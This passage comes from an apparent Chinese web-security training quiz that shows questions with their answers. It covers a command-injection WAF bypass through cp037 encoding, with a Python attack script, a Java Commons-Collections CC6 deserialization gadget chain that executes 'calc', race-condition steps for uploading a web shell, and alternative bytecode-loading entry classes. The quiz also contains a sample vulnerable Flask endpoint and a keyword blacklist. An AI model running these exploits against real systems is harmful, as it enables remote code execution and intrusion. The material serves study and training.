+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;ls&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&amp;&#39;</span><span class="p">]</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>        <span class="k">if</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">raw_data</span><span class="p">:</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;No hacker!&#39;</span><span class="p">}),</span> <span class="mi">403</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># 业务代码</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/ping&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">ping</span><span class="p">():</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="n">target</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">)</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ping -c 1 </span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span>
+</span></code></pre></div>
+问题：</p>
+<p>WAF 检查的是原始字节流还是解码后的字符串？为什么？</p>
+<p>已知业务代码通过 request.json 获取数据，默认使用 UTF-8 解码。请设计一种绕过 WAF 的方法，执行 cat /flag 命令。</p>
+<p>写出完整的 Python 攻击脚本（关键部分即可）。</p>
+<details> <summary><strong>📖 查看答案</strong></summary>
+1. WAF 检查的是原始字节流
+
+request.get_data() 返回 bytes 类型，不进行任何字符解码，直接检查传输层字节。
+
+2. 绕过方法
+
+利用编码差异：选择一个 WAF 黑名单字节不匹配、但业务代码能正确解码为攻击命令的编码。
+
+例如使用 cp037（EBCDIC）编码发送 cat /flag：
+
+WAF 看到的字节：\x83\x81\xa3\x40\x2f\x86\x81\x87（不包含 cat 的 ASCII 字节）
+
+业务代码解码后：cat /flag
+
+3. 攻击脚本
+
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://target.com/ping&quot;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="n">encoding</span> <span class="o">=</span> <span class="s2">&quot;cp037&quot;</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># 恶意 payload</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;target&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1; cat /flag&quot;</span><span class="p">}</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="n">json_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="c1"># 使用 cp037 编码发送</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">encoded_data</span> <span class="o">=</span> <span class="n">json_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>    <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;application/json; charset=</span><span class="si">{</span><span class="n">encoding</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">}</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encoded_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></code></pre></div>
+</details>
+
+<h3 id="2cc6">第2题（CC6 链构造）<a class="headerlink" href="#2cc6" title="Permanent link">&para;</a></h3>
+<p>请手动构造一个 CC6 链的 POC 核心部分（不需要完整导入语句），要求：</p>
+<p>写出 Transformer[] 数组的构造（用于执行 calc）</p>
+<p>写出如何包装到 LazyMap 和 TiedMapEntry</p>
+<p>写出如何触发反序列化执行</p>
+<details> <summary><strong>📖 查看答案</strong></summary>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">// 1. 构造 Transformer 链</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">ct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;getMethod&quot;</span><span class="p">,</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">});</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;invoke&quot;</span><span class="p">,</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">});</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">it3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">,</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;calc&quot;</span><span class="p">});</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">ct</span><span class="p">,</span><span class="w"> </span><span class="n">it1</span><span class="p">,</span><span class="w"> </span><span class="n">it2</span><span class="p">,</span><span class="w"> </span><span class="n">it3</span><span class="p">};</span>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="c1">// 2. 包装到 LazyMap（先用无害 factory）</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="n">HashMap</span><span class="w"> </span><span class="n">innerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">LazyMap</span><span class="w"> </span><span class="n">lazyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LazyMap</span><span class="p">)</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="c1">// 3. 包装到 TiedMapEntry</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="n">TiedMapEntry</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;key&quot;</span><span class="p">);</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="c1">// 4. 放入 HashMap</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">entry</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;value&quot;</span><span class="p">);</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="c1">// 5. 移除触发过的 key</span>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="n">lazyMap</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&quot;key&quot;</span><span class="p">);</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="c1">// 6. 反射替换 factory 为恶意 chain</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="n">Field</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lazyMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;factory&quot;</span><span class="p">);</span>
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="w"> </span><span class="n">chain</span><span class="p">);</span>
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="c1">// 7. 序列化 hashMap → 反序列化时触发</span>
+</span></code></pre></div>
+触发链路：
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>HashMap.readObject() → hash(key) → key.hashCode() 
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>→ TiedMapEntry.hashCode() → getValue() 
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>→ LazyMap.get() → factory.transform() 
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>→ ChainedTransformer → Runtime.exec(&quot;calc&quot;)
+</span></code></pre></div>
+</details>
+
+<h2 id="10">四、综合分析题（10分）<a class="headerlink" href="#10" title="Permanent link">&para;</a></h2>
+<p>场景： 你在代码审计中发现一个 Java Web 应用使用了以下依赖：</p>
+<p>commons-collections 3.2.1</p>
+<p>spring-web 5.x</p>
+<p>jackson-databind 2.9.x</p>
+<p>该应用存在一个反序列化入口：POST /api/data，接收 Content-Type: application/json 的请求体，使用 Jackson 反序列化，且开启了 enableDefaultTyping()。</p>
+<p>同时，应用还有一个文件上传功能，上传目录为 /uploads/，但该目录禁止执行脚本。</p>
+<p>问题：</p>
+<p>针对 Jackson 反序列化入口，你会优先尝试使用哪条 Gadget 链？为什么？（2分）</p>
+<p>如果 Jackson 链失败，你发现应用中还存在 Java 原生序列化入口（/api/export，接收序列化字节流），你会优先选择 CC1、CC5、CC6 中的哪一个？为什么？（3分）</p>
+<p>文件上传功能中，如何通过条件竞争绕过内容验证？请描述攻击步骤。（3分）</p>
+<p>如果将文件上传目录改为 /uploads/ + 随机字符串 + /，是否可以完全防御条件竞争？为什么？（2分）</p>
+<details> <summary><strong>📖 查看答案</strong></summary>
+
+1. Jackson 反序列化入口优先尝试的 Gadget 链
+
+优先尝试：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链
+
+原因：
+
+Jackson 开启 enableDefaultTyping() 后，可以在 JSON 中指定 @class，反序列化任意类。
+
+TemplatesImpl 是 JDK 内置类，不依赖第三方库，利用 _bytecodes 字段加载恶意字节码。
+
+相比 CC 链，Jackson 的 TemplatesImpl 链更加通用且稳定。
+
+
+2. 原生序列化入口优先选择
+
+优先选择：CC6
+
+原因：
+
+CC1 有 JDK ≤ 8u71 限制，CC5/CC6/CC7 无此限制。
+
+CC6 使用 HashMap 作为入口，HashMap 在 Java 应用中几乎无处不在，通用性最强。
+
+CC6 不依赖动态代理，调用链稳定。
+
+CC5 依赖 BadAttributeValueExpException（JMX 组件），不是所有环境都存在。
+
+CC7 依赖 Hashtable，不如 HashMap 常见。
+
+
+3. 条件竞争绕过内容验证
+
+攻击步骤：
+
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>1. 准备恶意 PHP 脚本（如 shell.php）
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>         ↓
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>2. 编写多线程脚本：
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>   - 线程 A：不断上传 shell.php（文件内容简单，方便快速上传）
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>   - 线程 B：不断访问 /uploads/shell.php
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>         ↓
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>3. 服务器接收上传文件 → 保存到临时目录/直接保存到目标目录
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>         ↓
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>4. 服务器执行内容验证（如扫描病毒、检查文件头）
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>         ↓
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>5. 在验证完成、删除恶意文件之前，线程 B 成功访问到文件
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>         ↓
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>6. 文件被服务器执行 → 获得 Web Shell
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>关键点： 利用“文件保存 → 验证 → 删除”之间的时间窗口。
+</span></code></pre></div>
+4. 随机目录是否可以完全防御？
+
+不能完全防御。
+
+原因：
+
+如果目录名使用弱随机算法（如 uniqid() 基于时间戳），攻击者可以爆破。
+
+攻击者可以延长文件处理时间（如上传大文件，填充垃圾字节），扩大爆破窗口。
+
+如果信息泄露（如目录名出现在错误信息、日志、API 响应中），攻击者可直接获取。
+
+正确做法： 使用强随机数（如 UUID.randomUUID()）+ 验证前存于非 Web 可访问目录 + 验证通过后随机化文件名。
+
+</details>
+
+<h2 id="10_1">五、附加题（挑战，10分）<a class="headerlink" href="#10_1" title="Permanent link">&para;</a></h2>
+<p><strong>题目</strong>：</p>
+<p>在 CC3 链中，使用了 InstantiateTransformer 来实例化 TrAXFilter，传入的参数是 TemplatesImpl 对象。请你解释：</p>
+<p>为什么实例化 TrAXFilter 会触发 TemplatesImpl.newTransformer()？</p>
+<p>如果目标环境的 TemplatesImpl 类被删除或不可用，还有哪些替代的“入口类”可以配合 InstantiateTransformer 或类似机制实现字节码加载？</p>
+<details> <summary><strong>📖 查看答案</strong></summary>
+
+1. 为什么实例化 TrAXFilter 会触发 TemplatesImpl.newTransformer()？
+
+TrAXFilter 的构造方法如下：
+
+<div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="kd">public</span><span class="w"> </span><span class="nf">TrAXFilter</span><span class="p">(</span><span class="n">Templates</span><span class="w"> </span><span class="n">templates</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransformerConfigurationException</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="k">this</span><span class="p">(</span><span class="n">templates</span><span class="p">.</span><span class="na">newTransformer</span><span class="p">());</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">}</span>
+</span></code></pre></div>
+构造方法接收一个 Templates 对象，并立即调用其 newTransformer() 方法。
+
+TemplatesImpl 实现了 Templates 接口。
+
+因此，InstantiateTransformer 实例化 TrAXFilter 时传入 TemplatesImpl 对象，会触发 TemplatesImpl.newTransformer()，进而加载 _bytecodes 中的恶意字节码。
+
+
+2. 替代的入口类
+
+如果 TemplatesImpl 不可用，可以考虑以下替代：
+
+类   原理
+com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl 同样涉及 Templates 操作
+com.sun.org.apache.bcel.internal.util.ClassLoader   BCEL 类加载器，可加载恶意字节码
+groovy.lang.GroovyShell 加载 Groovy 脚本执行命令（需 Groovy 依赖）
+javax.script.ScriptEngineManager    加载 JavaScript 等脚本引擎执行代码
+org.springframework.expression.spel.standard.SpelExpression SpEL 表达式执行（需 Spring 依赖）
+实际利用中，需要根据目标环境中的类来选择替代链。
+
+</details>
+
+<h2 id="my-answer">my answer<a class="headerlink" href="#my-answer" title="Permanent link">&para;</a></h2>
+<h3 id="_2">选择题<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<ol>
+<li>c</li>
+<li>B</li>
+<li>B</li>
+<li>A</li>
+<li>C</li>
+</ol>
+<h3 id="_3">简答题<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ol>
+<li>CC1：
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w"> </span><span class="n">proxyMap</span><span class="p">.</span><span class="na">entrySet</span><span class="p">()</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">   </span><span class="o">|</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">   </span><span class="n">InvocationHandler</span><span class="p">.</span><span class="na">invoke</span><span class="p">()</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">     </span><span class="o">|</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">     </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span>
+</span></code></pre></div>
+   CC5：
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">BadAttributeValueExpException</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w"> </span><span class="n">val</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w"> </span><span class="o">|</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w"> </span><span class="n">TiedMapEntry</span><span class="p">.</span><span class="na">getValue</span><span class="p">()</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">   </span><span class="o">|</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">   </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">get</span><span class="p">()</span>
+</span></code></pre></div>
+   CC6：
+   <div class="language-java highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">HashMap</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span>
